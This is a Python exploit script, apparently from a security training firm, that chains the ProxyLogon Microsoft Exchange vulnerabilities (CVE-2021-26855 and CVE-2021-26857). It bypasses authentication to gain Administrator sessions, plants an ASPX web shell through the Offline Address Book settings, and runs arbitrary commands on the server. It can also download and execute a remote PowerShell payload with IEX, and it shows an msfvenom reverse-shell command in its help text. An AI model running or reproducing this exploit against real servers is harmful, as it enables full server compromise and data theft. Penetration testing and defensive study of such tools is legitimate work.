# ProxyLogon
# Copyright (C) 2021 Gareth Lockwood, Immersive Labs
# https://github.com/Immersive-Labs-Sec/ProxyLogon
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import argparse
import random
import string
import time
import requests
from urllib3.exceptions import InsecureRequestWarning


class ProxyLogon:

    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

    def __init__(self, target, user, cmd, revPSScriptUrl):
        self.target = target
        self.user = user
        self.cmd = "" if cmd is None else cmd
        self.ps_script_url = (
            ""
            if revPSScriptUrl is None
            # AV will catch this consider updating
            else f"powershell -exec bypass -nop -c IEX (new-object net.webclient).downloadstring('{revPSScriptUrl}') "
        )
        self.user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
        self.shell_name = f"{ProxyLogon.get_random_string()}.aspx"
        self.endpoint_name = f"{ProxyLogon.get_random_string()}.js"
        self.shell_path = f"\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\{self.shell_name}"
        self.shell_url = f"https://{self.target}/owa/auth/{self.shell_name}"
        self.ecp_url = f"https://{self.target}/ecp/{self.endpoint_name}"
        self.shell_payload = 'http://iml/#<script language="JScript" runat="server">function Page_Load(){eval(Request["cmd"],"unsafe");}</script>'

    @staticmethod
    def get_random_string(size=5, chars=string.ascii_lowercase + string.digits) -> str:
        return "".join(random.choice(chars) for _ in range(size))

    def populate_fqdn(self):
        print("Attempting to get FQDN.")
        result = requests.get(
            self.ecp_url,
            headers={
                "Cookie": "X-BEResource=localhost~1942062522",
                "User-Agent": self.user_agent,
            },
            verify=False,
        )
        if "X-CalculatedBETarget" in result.headers and "X-FEServer" in result.headers:
            self.fqdn = result.headers["X-FEServer"]
            print(f"Target FQDN: {self.fqdn}")
        else:
            print("Failed to get FQDN.")

    def populate_server_info(self):
        print("Attempting to get Server and LegacyDN.")
        auto_discover_body = f"""<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>{self.user}</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>"""
        result = requests.post(
            self.ecp_url,
            headers={
                "Cookie": f"X-BEResource={self.fqdn}/autodiscover/autodiscover.xml?a=~1942062522;",
                "Content-Type": "text/xml",
                "User-Agent": self.user_agent,
            },
            data=auto_discover_body,
            verify=False,
        )
        if result.status_code != 200:
            print("Autodiscover failure.")

        self.legacy_dn = result.text.split(
            "<LegacyDN>")[1].split("</LegacyDN>")[0]
        self.server_id = result.text.split("<Server>")[1].split("</Server>")[0]
        print(f"LegacyDN: {self.legacy_dn}")
        print(f"ServerID: {self.server_id}")

    def populate_sid(self):

        mapi_payload = f"{self.legacy_dn}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
        result = requests.post(
            self.ecp_url,
            headers={
                "Cookie": f"X-BEResource=Administrator@{self.fqdn}:444/mapi/emsmdb?MailboxId={self.server_id}&a=~1942062522;",
                "Content-Type": "application/mapi-http",
                "X-Requesttype": "Connect",
                "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
                "X-Clientapplication": "Outlook/15.0.4815.1002",
                "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:2",
                "User-Agent": self.user_agent,
            },
            data=mapi_payload,
            verify=False,
        )

        if result.status_code != 200:
            print("Failed on SID.")
            exit(0)

        self.sid = result.text.split("with SID ")[1].split(
            " and MasterAccountSid")[0]
        print(f"Administrator Sid: {self.sid}")

    def populate_session_info(self):
        print("Attempting to set Administrator cookie.")
        body_payload = f"""<r at="Negotiate" ln="stormcrow"><s>{self.sid}</s></r>"""

        result = requests.post(
            self.ecp_url,
            headers={
                "Cookie": f"X-BEResource=Administrator@{self.fqdn}:444/ecp/proxyLogon.ecp?a=~1942062522;",
                "Content-Type": "text/xml",
                "msExchLogonMailbox": self.sid,
                "User-Agent": self.user_agent,
            },
            data=body_payload,
            verify=False,
        )

        if result.status_code != 241 or not "set-cookie" in result.headers:
            print("Failed to get Administrator cookie.")
            exit(0)

        self.session_id = (
            result.headers["set-cookie"].split("ASP.NET_SessionId=")[
                1].split(";")[0]
        )
        self.session_canary = (
            result.headers["set-cookie"].split("msExchEcpCanary=")[
                1].split(";")[0]
        )
        print("Administrator cookie set.")

    def populate_offline_address_book_id(self):
        print("Getting Offline Address Book ID.")
        result = requests.post(
            self.ecp_url,
            headers={
                "Cookie": f"X-BEResource=Administrator@{self.fqdn}:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary={self.session_canary}&a=~1942062522; ASP.NET_SessionId={self.session_id}; msExchEcpCanary={self.session_canary}",
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Language": "en-US,en;q=0.5",
                "X-Requested-With": "XMLHttpRequest",
                "msExchLogonMailbox": self.sid,
                "User-Agent": self.user_agent,
            },
            json={
                "filter": {
                    "Parameters": {
                        "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                        "SelectedView": "",
                        "SelectedVDirType": "All",
                    }
                },
                "sort": {},
            },
            verify=False,
        )
        if result.status_code != 200:
            print("Get OAB Error!")
            exit()
        self.oabId = result.text.split('"RawIdentity":"')[1].split('"')[0]
        print(f"OAB id: {self.oabId}")

    def push_oab_shell(self):
        print("Pushing OAB shell")
        OAB_payload = {
            "identity": {
                "__type": "Identity:ECP",
                "DisplayName": "OAB (Default Web Site)",
                "RawIdentity": self.oabId,
            },
            "properties": {
                "Parameters": {
                    "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                    "ExternalUrl": self.shell_payload,
                }
            },
        }
        result = requests.post(
            self.ecp_url,
            headers={
                "Cookie": f"X-BEResource=Administrator@{self.fqdn}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary={self.session_canary}&a=~1942062522; ASP.NET_SessionId={self.session_id}; msExchEcpCanary={self.session_canary}",
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Language": "en-US,en;q=0.5",
                "X-Requested-With": "XMLHttpRequest",
                "msExchLogonMailbox": self.sid,
                "User-Agent": self.user_agent,
            },
            json=OAB_payload,
            verify=False,
        )

        if result.status_code != 200:
            print("Failed to push OAB shell")
            exit()

        print("Shell in position")

    def pop_oab_shell(self):
        OAB_Payload = {
            "identity": {
                "__type": "Identity:ECP",
                "DisplayName": "OAB (Default Web Site)",
                "RawIdentity": self.oabId,
            },
            "properties": {
                "Parameters": {
                    "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                    "FilePathName": self.shell_path,
                }
            },
        }
        result = requests.post(
            self.ecp_url,
            headers={
                "Cookie": f"X-BEResource=Administrator@{self.fqdn}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary={self.session_canary}&a=~1942062522; ASP.NET_SessionId={self.session_id}; msExchEcpCanary={self.session_canary}",
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Language": "en-US,en;q=0.5",
                "X-Requested-With": "XMLHttpRequest",
                "msExchLogonMailbox": self.sid,
                "User-Agent": self.user_agent,
            },
            json=OAB_Payload,
            verify=False,
        )
        print("Shell ready, you can post extra commands to this with 'cmd' parameter:")
        print(f"""e.g. curl -X POST --url {self.shell_url} --header 'Content-Type: application/x-www-form-urlencoded' --data 'cmd=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami /all").stdout.readall())' -ks""")

    def exec_cmd(self, command):
        print(f"Executing: {command}")
        time.sleep(5)
        shell_payload = f"""cmd=Response.Write(new ActiveXObject("WScript.Shell").exec("{command}").stdout.readall())"""
        result = requests.post(
            self.shell_url,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": self.user_agent,
            },
            data=shell_payload,
            verify=False,
        )
        if result.status_code != 200:
            print("Command failed")
        print(result.text.split("\r\nName")[0])

    def run(self):
        # CVE-2021-26855
        print("Executing CVE-2021-26855")
        self.populate_fqdn()
        self.populate_server_info()
        self.populate_sid()
        self.populate_session_info()
        # CVE-2021-26857
        print("Moving onto CVE-2021-26857")
        self.populate_offline_address_book_id()  # OAB
        self.push_oab_shell()
        self.pop_oab_shell()
        # Pop that powershell
        if self.cmd != "":
            self.exec_cmd(self.cmd)
        if self.ps_script_url != "":
            self.exec_cmd(self.ps_script_url)
        return 0


def get_args():
    parser = argparse.ArgumentParser(
        prog="ProxyLogon",
        epilog="msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=8443 -f psh -o shell.ps1",
        description="This script can be used to run commands against a vulnerable Exchange Server. MSFvenom Example at the end",
        usage="python3 proxylogon.py -t internal.bartertowngroup.com -u administrator@internal.bartertowngroup.com -r http://10.10.10.10:8080/shell.ps1",
    )
    parser.add_argument(
        "-t", "--target", type=str, help="Exchange server to target.", required=True
    )
    parser.add_argument(
        "-u", "--user", type=str, help="User email address to target.", required=True
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        "-r", "--psurl", type=str, help="Url for powershell script to be executed."
    )
    group.add_argument(
        "-c",
        "--cmd",
        type=str,
        help="Command to run against server",
    )
    args = parser.parse_args()
    return args


def main():
    args = get_args()
    proxyLogon = ProxyLogon(args.target, args.user, args.cmd, args.psurl)
    proxyLogon.run()


if __name__ == "__main__":
    main()
